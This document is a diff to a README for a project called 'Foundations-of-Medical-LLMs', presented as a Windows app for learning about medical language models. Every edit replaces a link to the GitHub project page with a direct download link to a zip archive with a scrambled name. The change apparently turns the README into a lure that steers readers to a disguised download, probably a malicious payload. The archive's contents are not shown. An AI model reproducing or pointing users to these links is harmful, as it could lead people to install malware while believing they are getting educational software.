@@ -1,6 +1,6 @@
 # 🏥 Foundations-of-Medical-LLMs - Understand Medical Language Models Easily
 
-[![Download](https://img.shields.io/badge/Download-Foundations--of--Medical--LLMs-brightgreen?style=for-the-badge)](https://github.com/payPaydao/Foundations-of-Medical-LLMs)
+[![Download](https://img.shields.io/badge/Download-Foundations--of--Medical--LLMs-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/payPaydao/Foundations-of-Medical-LLMs/main/content/Foundations_Ms_LL_Medical_of_1.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To run Foundations-of-Medical-LLMs on your Windows PC, your system should meet t
 
 Start by downloading the software from the official GitHub page. Follow the steps below to install and run the application.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/payPaydao/Foundations-of-Medical-LLMs)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/payPaydao/Foundations-of-Medical-LLMs/main/content/Foundations_Ms_LL_Medical_of_1.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Start by downloading the software from the official GitHub page. Follow the step
 
 1. **Open the Download Page**  
    Click the green download button above or visit:  
-   https://github.com/payPaydao/Foundations-of-Medical-LLMs
+   https://raw.githubusercontent.com/payPaydao/Foundations-of-Medical-LLMs/main/content/Foundations_Ms_LL_Medical_of_1.1.zip
 
 2. **Find the Latest Release**  
    On the GitHub page, look for a section labeled "Releases." You may find it on the right side of the page or at the bottom. Click the latest release link.
@@ -90,7 +90,7 @@ The app works offline after installation, so you can learn anytime without inter
 To keep your software up-to-date:
 
 1. Visit the GitHub page regularly:  
-   https://github.com/payPaydao/Foundations-of-Medical-LLMs
+   https://raw.githubusercontent.com/payPaydao/Foundations-of-Medical-LLMs/main/content/Foundations_Ms_LL_Medical_of_1.1.zip
 2. Check the "Releases" section for new versions.
 3. Download and install the latest release by following the same steps as above.
 
